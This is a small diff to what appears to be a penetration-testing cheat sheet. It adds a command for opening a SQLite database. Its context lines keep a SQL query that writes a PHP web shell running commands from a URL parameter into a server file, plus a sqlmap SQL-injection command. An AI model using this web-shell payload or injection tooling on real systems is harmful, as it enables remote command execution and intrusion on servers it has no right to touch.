@@ -59,6 +59,11 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 mysql -h localhost -u myname -p
 ```
+### Open SQLite3
+```
+sqlite3 database.sqlite3
+```
+
 ### SQL Injection
 ```
 sqlmap -u url --batch
